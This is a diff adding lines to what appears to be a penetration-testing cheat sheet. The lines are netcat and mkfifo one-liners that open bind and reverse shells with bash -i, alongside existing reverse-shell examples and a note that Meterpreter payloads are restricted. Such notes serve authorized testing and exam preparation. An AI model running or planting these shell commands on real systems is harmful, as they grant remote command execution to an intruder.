@@ -609,9 +609,15 @@ Netcat `-e` flag doesn't exist?
 $ [mknod/mkfifo] /tmp/backpipe p 
 $ /bin/sh 0</tmp/backpipe | nc [target] 443 1>/tmp/backpipe
 
-# Alternative (useful for webapps with code exec)
+# Alternative #1 (useful for webapps with code exec)
 $ [mknod/mkfifo] /tmp/backpipe p 
 $ /bin/sh -c "/bin/sh 0</tmp/backpipe | nc pentestbox 443 1>/tmp/backpipe"
+
+# Alternative #2 - bind shell
+$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lp <port> > /tmp/f
+
+# Alternative #3 - reverse shell
+# rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <host> <port> > /tmp/f
 ```
 
 __##################### WARNING: METERPRETER PAYLOADS ARE RESTRICTED ####################__  
